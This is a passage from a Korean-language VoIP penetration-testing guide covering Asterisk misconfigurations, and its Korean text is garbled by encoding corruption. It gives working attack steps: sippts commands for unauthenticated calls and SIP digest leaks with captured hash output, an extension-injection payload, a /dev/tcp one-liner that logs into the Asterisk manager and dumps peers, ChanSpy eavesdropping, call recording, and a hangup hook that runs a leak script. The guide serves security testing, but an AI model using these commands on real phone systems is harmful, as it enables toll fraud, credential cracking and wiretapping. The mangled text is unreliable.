**`type=friend`**ê°€ ì‚¬ìš©ë  ë•Œ, **host** ë³€ìˆ˜ì˜ **ê°’**ì€ **ì‚¬ìš©ë˜ì§€ ì•Šìœ¼ë¯€ë¡œ**, ê´€ë¦¬ìê°€ í•´ë‹¹ ê°’ì„ ì‚¬ìš©í•˜ì—¬ **SIP-trunkë¥¼ ì˜ëª» êµ¬ì„±í•˜ë©´**, **ëˆ„êµ¬ë‚˜ ì—°ê²°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

ì˜ˆë¥¼ ë“¤ì–´, ì´ êµ¬ì„±ì€ ì·¨ì•½í•  ê²ƒì…ë‹ˆë‹¤:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### ë¬´ë£Œ í†µí™” / Asterisks ì»¨í…ìŠ¤íŠ¸ ì˜ëª» êµ¬ì„±

Asteriskì—ì„œ **ì»¨í…ìŠ¤íŠ¸**ëŠ” **ê´€ë ¨ëœ í™•ì¥, ì‘ì—… ë° ê·œì¹™ì„ ê·¸ë£¹í™”í•˜ëŠ”** ì´ë¦„ì´ ìˆëŠ” ì»¨í…Œì´ë„ˆ ë˜ëŠ” ì„¹ì…˜ì…ë‹ˆë‹¤. ë‹¤ì´ì–¼ í”Œëœì€ Asterisk ì‹œìŠ¤í…œì˜ í•µì‹¬ êµ¬ì„± ìš”ì†Œë¡œ, **ìˆ˜ì‹  ë° ë°œì‹  ì „í™”ë¥¼ ì²˜ë¦¬í•˜ê³  ë¼ìš°íŒ…í•˜ëŠ” ë°©ë²•ì„ ì •ì˜í•©ë‹ˆë‹¤**. ì»¨í…ìŠ¤íŠ¸ëŠ” ë‹¤ì´ì–¼ í”Œëœì„ êµ¬ì„±í•˜ê³ , ì ‘ê·¼ ì œì–´ë¥¼ ê´€ë¦¬í•˜ë©°, ì‹œìŠ¤í…œì˜ ì„œë¡œ ë‹¤ë¥¸ ë¶€ë¶„ ê°„ì˜ ë¶„ë¦¬ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

ê° ì»¨í…ìŠ¤íŠ¸ëŠ” êµ¬ì„± íŒŒì¼, ì¼ë°˜ì ìœ¼ë¡œ **`extensions.conf`** íŒŒì¼ì— ì •ì˜ë©ë‹ˆë‹¤. ì»¨í…ìŠ¤íŠ¸ëŠ” ëŒ€ê´„í˜¸ë¡œ í‘œì‹œë˜ë©°, ê·¸ ì•ˆì— ì»¨í…ìŠ¤íŠ¸ ì´ë¦„ì´ í¬í•¨ë©ë‹ˆë‹¤. ì˜ˆ:
```bash
csharpCopy code[my_context]
```
ë‚´ë¶€ ì»¨í…ìŠ¤íŠ¸ì—ì„œ, ë‹¹ì‹ ì€ í™•ì¥(ë‹¤ì´ì–¼ëœ ë²ˆí˜¸ì˜ íŒ¨í„´)ì„ ì •ì˜í•˜ê³  ì´ë¥¼ ì¼ë ¨ì˜ ë™ì‘ì´ë‚˜ ì• í”Œë¦¬ì¼€ì´ì…˜ê³¼ ì—°ê´€ì‹œí‚µë‹ˆë‹¤. ì´ëŸ¬í•œ ë™ì‘ì€ í†µí™”ê°€ ì²˜ë¦¬ë˜ëŠ” ë°©ì‹ì„ ê²°ì •í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
ì´ ì˜ˆì œëŠ” "my\_context"ë¼ëŠ” ê°„ë‹¨í•œ ì»¨í…ìŠ¤íŠ¸ì™€ "100"ì´ë¼ëŠ” í™•ì¥ì„ ë³´ì—¬ì¤ë‹ˆë‹¤. ëˆ„êµ°ê°€ 100ì„ ë‹¤ì´ì–¼í•˜ë©´, í†µí™”ê°€ ì—°ê²°ë˜ê³  í™˜ì˜ ë©”ì‹œì§€ê°€ ì¬ìƒëœ í›„ í†µí™”ê°€ ì¢…ë£Œë©ë‹ˆë‹¤.

ì´ê²ƒì€ **ë‹¤ë¥¸ ì»¨í…ìŠ¤íŠ¸**ë¡œ, **ë‹¤ë¥¸ ë²ˆí˜¸ë¡œ ì „í™”ë¥¼ ê±¸ ìˆ˜ ìˆê²Œ** í•©ë‹ˆë‹¤:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
ê´€ë¦¬ìê°€ **ê¸°ë³¸ ì»¨í…ìŠ¤íŠ¸**ë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ì •ì˜í•˜ë©´:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
ëˆ„êµ¬ë‚˜ **ì„œë²„ë¥¼ ì‚¬ìš©í•˜ì—¬ ë‹¤ë¥¸ ë²ˆí˜¸ë¡œ ì „í™”ë¥¼ ê±¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤** (ì„œë²„ì˜ ê´€ë¦¬ìê°€ ì „í™”ë¥¼ ë¹„ìš©ì„ ì§€ë¶ˆí•©ë‹ˆë‹¤).
{% endhint %}

{% hint style="danger" %}
ê²Œë‹¤ê°€ ê¸°ë³¸ì ìœ¼ë¡œ **`sip.conf`** íŒŒì¼ì—ëŠ” **`allowguest=true`**ê°€ í¬í•¨ë˜ì–´ ìˆìœ¼ë¯€ë¡œ **ì¸ì¦ ì—†ì´** **ì–´ë–¤** ê³µê²©ìë„ ë‹¤ë¥¸ ë²ˆí˜¸ë¡œ ì „í™”ë¥¼ ê±¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

*   **`SIPPTS invite`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS inviteëŠ” **PBX ì„œë²„ê°€ ì¸ì¦ ì—†ì´ ì „í™”ë¥¼ ê±¸ ìˆ˜ ìˆë„ë¡ í—ˆìš©í•˜ëŠ”ì§€** í™•ì¸í•©ë‹ˆë‹¤. SIP ì„œë²„ì˜ êµ¬ì„±ì´ ì˜ëª»ëœ ê²½ìš° ì™¸ë¶€ ë²ˆí˜¸ë¡œ ì „í™”ë¥¼ ê±¸ ìˆ˜ ìˆë„ë¡ í—ˆìš©í•©ë‹ˆë‹¤. ë˜í•œ ì „í™”ë¥¼ ë‘ ë²ˆì§¸ ì™¸ë¶€ ë²ˆí˜¸ë¡œ ì „ì†¡í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, Asterisk ì„œë²„ì— ì˜ëª»ëœ ì»¨í…ìŠ¤íŠ¸ êµ¬ì„±ì´ ìˆëŠ” ê²½ìš°, ì¸ì¦ ì—†ì´ INVITE ìš”ì²­ì„ ìˆ˜ë½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê²½ìš° ê³µê²©ìëŠ” ì‚¬ìš©ì/ë¹„ë°€ë²ˆí˜¸ë¥¼ ì•Œì§€ ëª»í•˜ê³ ë„ ì „í™”ë¥¼ ê±¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### ë¬´ë£Œ í†µí™” / ì˜ëª» êµ¬ì„±ëœ IVRS

IVRSëŠ” **ì¸í„°ë™í‹°ë¸Œ ìŒì„± ì‘ë‹µ ì‹œìŠ¤í…œ**ì„ ì˜ë¯¸í•˜ë©°, ì‚¬ìš©ìê°€ ìŒì„± ë˜ëŠ” í„°ì¹˜í†¤ ì…ë ¥ì„ í†µí•´ ì»´í“¨í„°í™”ëœ ì‹œìŠ¤í…œê³¼ ìƒí˜¸ì‘ìš©í•  ìˆ˜ ìˆë„ë¡ í•˜ëŠ” ì „í™” ê¸°ìˆ ì…ë‹ˆë‹¤. IVRSëŠ” ì •ë³´ë¥¼ ì œê³µí•˜ê³ , ì „í™”ë¥¼ ë¼ìš°íŒ…í•˜ë©°, ì‚¬ìš©ì ì…ë ¥ì„ ìº¡ì²˜í•˜ëŠ” ë“± ë‹¤ì–‘í•œ ê¸°ëŠ¥ì„ ì œê³µí•˜ëŠ” **ìë™í™”ëœ í†µí™” ì²˜ë¦¬** ì‹œìŠ¤í…œì„ êµ¬ì¶•í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.

VoIP ì‹œìŠ¤í…œì˜ IVRSëŠ” ì¼ë°˜ì ìœ¼ë¡œ ë‹¤ìŒìœ¼ë¡œ êµ¬ì„±ë©ë‹ˆë‹¤:

1. **ìŒì„± í”„ë¡¬í”„íŠ¸**: ì‚¬ìš©ìì—ê²Œ IVR ë©”ë‰´ ì˜µì…˜ ë° ì§€ì¹¨ì„ ì•ˆë‚´í•˜ëŠ” ë¯¸ë¦¬ ë…¹ìŒëœ ì˜¤ë””ì˜¤ ë©”ì‹œì§€ì…ë‹ˆë‹¤.
2. **DTMF** (ë“€ì–¼ í†¤ ë‹¤ì¤‘ ì£¼íŒŒìˆ˜) ì‹ í˜¸: ì „í™” í‚¤ë¥¼ ëˆŒëŸ¬ ìƒì„±ëœ í„°ì¹˜í†¤ ì…ë ¥ìœ¼ë¡œ, IVR ë©”ë‰´ë¥¼ íƒìƒ‰í•˜ê³  ì…ë ¥ì„ ì œê³µí•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.
3. **í†µí™” ë¼ìš°íŒ…**: ì‚¬ìš©ì ì…ë ¥ì— ë”°ë¼ íŠ¹ì • ë¶€ì„œ, ìƒë‹´ì› ë˜ëŠ” ë‚´ì„ ìœ¼ë¡œ ì „í™”ë¥¼ ì ì ˆí•œ ëª©ì ì§€ë¡œ ì•ˆë‚´í•©ë‹ˆë‹¤.
4. **ì‚¬ìš©ì ì…ë ¥ ìº¡ì²˜**: ê³„ì¢Œ ë²ˆí˜¸, ì‚¬ê±´ ID ë˜ëŠ” ê¸°íƒ€ ê´€ë ¨ ë°ì´í„°ë¥¼ í¬í•¨í•˜ì—¬ ë°œì‹ ìë¡œë¶€í„° ì •ë³´ë¥¼ ìˆ˜ì§‘í•©ë‹ˆë‹¤.
5. **ì™¸ë¶€ ì‹œìŠ¤í…œê³¼ì˜ í†µí•©**: IVR ì‹œìŠ¤í…œì„ ë°ì´í„°ë² ì´ìŠ¤ ë˜ëŠ” ê¸°íƒ€ ì†Œí”„íŠ¸ì›¨ì–´ ì‹œìŠ¤í…œì— ì—°ê²°í•˜ì—¬ ì •ë³´ë¥¼ ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ ì—…ë°ì´íŠ¸í•˜ê³ , ì‘ì—…ì„ ìˆ˜í–‰í•˜ê±°ë‚˜ ì´ë²¤íŠ¸ë¥¼ íŠ¸ë¦¬ê±°í•©ë‹ˆë‹¤.

Asterisk VoIP ì‹œìŠ¤í…œì—ì„œëŠ” ë‹¤ì´ì–¼ í”Œëœ (**`extensions.conf`** íŒŒì¼)ê³¼ `Background()`, `Playback()`, `Read()` ë“± ë‹¤ì–‘í•œ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì‚¬ìš©í•˜ì—¬ IVRì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ì• í”Œë¦¬ì¼€ì´ì…˜ì€ ìŒì„± í”„ë¡¬í”„íŠ¸ë¥¼ ì¬ìƒí•˜ê³ , ì‚¬ìš©ì ì…ë ¥ì„ ìº¡ì²˜í•˜ë©°, í†µí™” íë¦„ì„ ì œì–´í•˜ëŠ” ë° ë„ì›€ì„ ì¤ë‹ˆë‹¤.

#### ì·¨ì•½í•œ êµ¬ì„±ì˜ ì˜ˆ
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
ì´ì „ì€ ì‚¬ìš©ìê°€ **ë¶€ì„œë¥¼ í˜¸ì¶œí•˜ê¸° ìœ„í•´ 1ì„ ëˆ„ë¥´ê±°ë‚˜**, **ë‹¤ë¥¸ ë¶€ì„œë¥¼ í˜¸ì¶œí•˜ê¸° ìœ„í•´ 2ë¥¼ ëˆ„ë¥´ê±°ë‚˜**, **ì•Œê³  ìˆëŠ” ì „ì²´ ë‚´ì„  ë²ˆí˜¸ë¥¼ ì…ë ¥í•˜ë¼ëŠ”** ì˜ˆì…ë‹ˆë‹¤.\
ì·¨ì•½ì ì€ ì§€ì •ëœ **ë‚´ì„  ê¸¸ì´ê°€ í™•ì¸ë˜ì§€ ì•Šê¸° ë•Œë¬¸ì— ì‚¬ìš©ìê°€ 5ì´ˆ íƒ€ì„ì•„ì›ƒì„ ì…ë ¥í•˜ì—¬ ì „ì²´ ë²ˆí˜¸ë¥¼ ì…ë ¥í•  ìˆ˜ ìˆê³ , í˜¸ì¶œë  ìˆ˜ ìˆë‹¤ëŠ”** ì‚¬ì‹¤ì…ë‹ˆë‹¤.

### Extension Injection

ë‹¤ìŒê³¼ ê°™ì€ ë‚´ì„ ì„ ì‚¬ìš©í•˜ì—¬:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Where **`${EXTEN}`**ëŠ” í˜¸ì¶œë  **ë‚´ì„ **ì´ë©°, **ext 101ì´ ë„ì…ë˜ë©´** ë‹¤ìŒê³¼ ê°™ì€ ì¼ì´ ë°œìƒí•©ë‹ˆë‹¤:
```scss
exten => 101,1,Dial(SIP/101)
```
ê·¸ëŸ¬ë‚˜ **`${EXTEN}`**ì´ **ìˆ«ì ì´ìƒ**ì„ ì…ë ¥í•  ìˆ˜ ìˆê²Œ í—ˆìš©í•œë‹¤ë©´(êµ¬ë²„ì „ Asteriskì™€ ê°™ì´), ê³µê²©ìëŠ” **`101&SIP123123123`**ì„ ì…ë ¥í•˜ì—¬ ì „í™”ë²ˆí˜¸ 123123123ìœ¼ë¡œ ì „í™”ë¥¼ ê±¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  ì´ê²ƒì´ ê²°ê³¼ì…ë‹ˆë‹¤:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
ë”°ë¼ì„œ **`101`** ë° **`123123123`**ìœ¼ë¡œì˜ í˜¸ì¶œì´ ì „ì†¡ë˜ë©°, ì²« ë²ˆì§¸ í˜¸ì¶œë§Œ ì—°ê²°ë©ë‹ˆë‹¤... ê·¸ëŸ¬ë‚˜ ê³µê²©ìê°€ **ì¼ì¹˜í•˜ëŠ” í•­ëª©ì„ ìš°íšŒí•˜ëŠ” í™•ì¥**ì„ ì‚¬ìš©í•˜ì§€ë§Œ ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ê²½ìš°, ê·¸ëŠ” **ì›í•˜ëŠ” ë²ˆí˜¸ë¡œë§Œ ì „í™”ë¥¼ ì£¼ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

## SIPDigestLeak ì·¨ì•½ì 

SIP Digest LeakëŠ” í•˜ë“œì›¨ì–´ ë° ì†Œí”„íŠ¸ì›¨ì–´ IP ì „í™”ì™€ ì „í™” ì–´ëŒ‘í„°(VoIPì—ì„œ ì•„ë‚ ë¡œê·¸ë¡œ) ë“± ë§ì€ SIP ì „í™”ì— ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ **ë¹„ë°€ë²ˆí˜¸ë¡œë¶€í„° ê³„ì‚°ëœ Digest ì¸ì¦ ì‘ë‹µì˜ ìœ ì¶œ**ì„ í—ˆìš©í•©ë‹ˆë‹¤. **ì˜¤í”„ë¼ì¸ ë¹„ë°€ë²ˆí˜¸ ê³µê²©ì´ ê°€ëŠ¥í•´ì§€ë©°** ë„ì „ ì‘ë‹µì„ ê¸°ë°˜ìœ¼ë¡œ ëŒ€ë¶€ë¶„ì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ë³µêµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**[ì—¬ê¸°ì—ì„œì˜ ì·¨ì•½ì  ì‹œë‚˜ë¦¬ì˜¤**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. IP ì „í™”(í”¼í•´ì)ëŠ” ëª¨ë“  í¬íŠ¸(ì˜ˆ: 5060)ì—ì„œ ì „í™”ë¥¼ ìˆ˜ì‹ í•˜ê³  ìˆìŠµë‹ˆë‹¤.
2. ê³µê²©ìê°€ IP ì „í™”ì— INVITEë¥¼ ë³´ëƒ…ë‹ˆë‹¤.
3. í”¼í•´ì ì „í™”ê°€ ìš¸ë¦¬ê¸° ì‹œì‘í•˜ê³  ëˆ„êµ°ê°€ ì „í™”ë¥¼ ë°›ê³  ëŠìŠµë‹ˆë‹¤(ìƒëŒ€ë°©ì´ ì „í™”ë¥¼ ë°›ì§€ ì•Šê¸° ë•Œë¬¸ì—).
4. ì „í™”ê°€ ëŠì–´ì§€ë©´ **í”¼í•´ì ì „í™”ê°€ ê³µê²©ìì—ê²Œ BYEë¥¼ ë³´ëƒ…ë‹ˆë‹¤**.
5. **ê³µê²©ìê°€ 407 ì‘ë‹µì„ ë°œí–‰**í•˜ì—¬ **ì¸ì¦ì„ ìš”ì²­**í•˜ê³  ì¸ì¦ ë„ì „ì„ ë°œí–‰í•©ë‹ˆë‹¤.
6. **í”¼í•´ì ì „í™”ê°€ ë‘ ë²ˆì§¸ BYEì—ì„œ ì¸ì¦ ë„ì „ì— ëŒ€í•œ ì‘ë‹µì„ ì œê³µí•©ë‹ˆë‹¤**.
7. **ê³µê²©ìëŠ” ìì‹ ì˜ ë¡œì»¬ ë¨¸ì‹ (ë˜ëŠ” ë¶„ì‚° ë„¤íŠ¸ì›Œí¬ ë“±)ì—ì„œ ë„ì „ ì‘ë‹µì— ëŒ€í•œ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìœ¼ë©°** ë¹„ë°€ë²ˆí˜¸ë¥¼ ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* **SIPPTS ìœ ì¶œ**ì€ [**sippts**](https://github.com/Pepelux/sippts)**ì—ì„œ:** SIPPTS ìœ ì¶œì€ ë§ì€ SIP ì „í™”ì— ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” SIP Digest Leak ì·¨ì•½ì ì„ ì•…ìš©í•©ë‹ˆë‹¤. ì¶œë ¥ì€ SipCrack í˜•ì‹ìœ¼ë¡œ ì €ì¥ë˜ì–´ SIPPTS dcrack ë˜ëŠ” SipCrack ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Callì€ **ì›¹ ì‚¬ìš©ì**ê°€ (ì˜ˆë¥¼ ë“¤ì–´, ì œí’ˆì— ê´€ì‹¬ì´ ìˆì„ ìˆ˜ ìˆëŠ”) **ì „í™”ë²ˆí˜¸**ë¥¼ **ì œê³µ**í•˜ì—¬ ì „í™”ë¥¼ ë°›ì„ ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë©´ ìƒì—…ì ì¸ ì „í™”ê°€ ê±¸ë¦¬ê³ , ì‚¬ìš©ìê°€ **ì „í™”ë¥¼ ë°›ìœ¼ë©´** ì‚¬ìš©ìì™€ **ìƒë‹´ì›ì´ ì—°ê²°**ë©ë‹ˆë‹¤.

ì´ì™€ ê´€ë ¨ëœ ì¼ë°˜ì ì¸ Asterisk í”„ë¡œí•„ì€:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* ì´ì „ í”„ë¡œí•„ì€ **ëª¨ë“  IP ì£¼ì†Œê°€ ì—°ê²°í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©**í•˜ê³  ìˆìŠµë‹ˆë‹¤ (ë¹„ë°€ë²ˆí˜¸ê°€ ì•Œë ¤ì§„ ê²½ìš°).
* **ì „í™”ë¥¼ ì¡°ì§í•˜ê¸° ìœ„í•´**, ì´ì „ì— ëª…ì‹œëœ ëŒ€ë¡œ, **ì½ê¸° ê¶Œí•œì´ í•„ìš”í•˜ì§€ ì•Šìœ¼ë©°** **ì˜¤ì§** **ì“°ê¸°**ì—ì„œ **ë°œì‹ **ë§Œ í•„ìš”í•©ë‹ˆë‹¤.

ì´ëŸ¬í•œ ê¶Œí•œìœ¼ë¡œ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì•„ëŠ” ëª¨ë“  IPê°€ ì—°ê²°í•˜ì—¬ ë„ˆë¬´ ë§ì€ ì •ë³´ë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤, ì˜ˆë¥¼ ë“¤ì–´: 

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**ì¶”ê°€ ì •ë³´ë‚˜ ì¡°ì¹˜ë¥¼ ìš”ì²­í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

### **ë„ì²­**

Asteriskì—ì„œëŠ” **`ChanSpy`** ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ **ëª¨ë‹ˆí„°ë§í•  ë‚´ì„ **(ë˜ëŠ” ëª¨ë“  ë‚´ì„ )ì„ ì§€ì •í•˜ì—¬ ì§„í–‰ ì¤‘ì¸ ëŒ€í™”ë¥¼ ë“¤ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ëª…ë ¹ì–´ëŠ” ë‚´ì„ ì— í• ë‹¹ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, **`exten => 333,1,ChanSpy('all',qb)`**ëŠ” **ë‚´ì„  333**ìœ¼ë¡œ **ì „í™”**ë¥¼ ê±¸ë©´ **ëª¨ë“ ** ë‚´ì„ ì„ **ëª¨ë‹ˆí„°ë§**í•˜ê³ , ìƒˆë¡œìš´ ëŒ€í™”ê°€ ì‹œì‘ë  ë•Œë§ˆë‹¤ (**`b`**) ì¡°ìš©í•œ ëª¨ë“œ(**`q`**)ë¡œ **ë“£ê¸° ì‹œì‘**í•¨ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ìš°ë¦¬ëŠ” ì´ì— ìƒí˜¸ì‘ìš©í•˜ê³  ì‹¶ì§€ ì•Šê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. **`*`**ë¥¼ ëˆŒëŸ¬ì„œ ë˜ëŠ” ë‚´ì„  ë²ˆí˜¸ë¥¼ ì…ë ¥í•˜ì—¬ ì§„í–‰ ì¤‘ì¸ ëŒ€í™”ì—ì„œ ë‹¤ë¥¸ ëŒ€í™”ë¡œ ì´ë™í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

í•˜ë‚˜ì˜ ë‚´ì„ ë§Œ ëª¨ë‹ˆí„°ë§í•˜ë ¤ë©´ **`ExtenSpy`**ë¥¼ ì‚¬ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

ëŒ€í™”ë¥¼ ë“£ëŠ” ëŒ€ì‹ , ë‹¤ìŒê³¼ ê°™ì€ ë‚´ì„ ì„ ì‚¬ìš©í•˜ì—¬ **íŒŒì¼ì— ê¸°ë¡**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

í†µí™”ëŠ” **`/tmp`**ì— ì €ì¥ë©ë‹ˆë‹¤.

Asteriskê°€ í†µí™”ê°€ ì¢…ë£Œë  ë•Œ **í†µí™”ë¥¼ ìœ ì¶œí•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰**í•˜ë„ë¡ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed ì·¨ì•½ì 

**RTCPBleed**ëŠ” Asterisk ê¸°ë°˜ VoIP ì„œë²„ì— ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” ì£¼ìš” ë³´ì•ˆ ë¬¸ì œì…ë‹ˆë‹¤(2017ë…„ì— ë°œí‘œë¨). ì´ ì·¨ì•½ì ì€ VoIP ëŒ€í™”ë¥¼ ì „ë‹¬í•˜ëŠ” **RTP(ì‹¤ì‹œê°„ í”„ë¡œí† ì½œ) íŠ¸ë˜í”½**ì´ **ì¸í„°ë„·ì˜ ëˆ„êµ¬ë‚˜ ê°€ë¡œì±„ê³  ë¦¬ë””ë ‰ì…˜í•  ìˆ˜ ìˆë„ë¡** í—ˆìš©í•©ë‹ˆë‹¤. ì´ëŠ” RTP íŠ¸ë˜í”½ì´ NAT(ë„¤íŠ¸ì›Œí¬ ì£¼ì†Œ ë³€í™˜) ë°©í™”ë²½ì„ í†µê³¼í•  ë•Œ ì¸ì¦ì„ ìš°íšŒí•˜ê¸° ë•Œë¬¸ì— ë°œìƒí•©ë‹ˆë‹¤.

RTP í”„ë¡ì‹œëŠ” ë‘ ê°œ ì´ìƒì˜ ë‹¹ì‚¬ì ê°„ì˜ RTP ìŠ¤íŠ¸ë¦¼ì„ í”„ë¡ì‹œí•˜ì—¬ RTC ì‹œìŠ¤í…œì— ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” **NAT ì œí•œ**ì„ í•´ê²°í•˜ë ¤ê³  í•©ë‹ˆë‹¤. NATê°€ ìˆëŠ” ê²½ìš°, RTP í”„ë¡ì‹œ ì†Œí”„íŠ¸ì›¨ì–´ëŠ” ì¢…ì¢… ì‹ í˜¸ë¥¼ í†µí•´ ê²€ìƒ‰ëœ RTP IP ë° í¬íŠ¸ ì •ë³´ë¥¼ ì‹ ë¢°í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤(ì˜ˆ: SIP). ë”°ë¼ì„œ ì—¬ëŸ¬ RTP í”„ë¡ì‹œëŠ” ì´ëŸ¬í•œ **IP ë° í¬íŠ¸ íŠœí”Œì„ ìë™ìœ¼ë¡œ í•™ìŠµí•˜ëŠ” ë©”ì»¤ë‹ˆì¦˜**ì„ êµ¬í˜„í–ˆìŠµë‹ˆë‹¤. ì´ëŠ” ì¢…ì¢… ë“¤ì–´ì˜¤ëŠ” RTP íŠ¸ë˜í”½ì„ ê²€ì‚¬í•˜ê³  ë“¤ì–´ì˜¤ëŠ” RTP íŠ¸ë˜í”½ì˜ ì¶œë°œì§€ IP ë° í¬íŠ¸ë¥¼ ì‘ë‹µí•´ì•¼ í•  ê²ƒìœ¼ë¡œ í‘œì‹œí•˜ëŠ” ë°©ì‹ìœ¼ë¡œ ìˆ˜í–‰ë©ë‹ˆë‹¤. ì´ ë©”ì»¤ë‹ˆì¦˜ì€ "í•™ìŠµ ëª¨ë“œ"ë¼ê³  ë¶ˆë¦´ ìˆ˜ ìˆìœ¼ë©°, **ì–´ë– í•œ ì¢…ë¥˜ì˜ ì¸ì¦ë„ ì‚¬ìš©í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ë”°ë¼ì„œ **ê³µê²©ì**ëŠ” **RTP í”„ë¡ì‹œë¡œ RTP íŠ¸ë˜í”½ì„ ì „ì†¡í•˜ê³ ** ì§„í–‰ ì¤‘ì¸ RTP ìŠ¤íŠ¸ë¦¼ì˜ ë°œì‹ ì ë˜ëŠ” ìˆ˜ì‹ ìë¥¼ ìœ„í•´ ì˜ë„ëœ í”„ë¡ì‹œ RTP íŠ¸ë˜í”½ì„ ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìš°ë¦¬ëŠ” ì´ ì·¨ì•½ì ì„ RTP Bleedë¼ê³  ë¶€ë¥´ë©°, ì´ëŠ” ê³µê²©ìê°€ í•©ë²•ì ì¸ ì‚¬ìš©ìì—ê²Œ ì „ì†¡ë  RTP ë¯¸ë””ì–´ ìŠ¤íŠ¸ë¦¼ì„ ë°›ì„ ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.

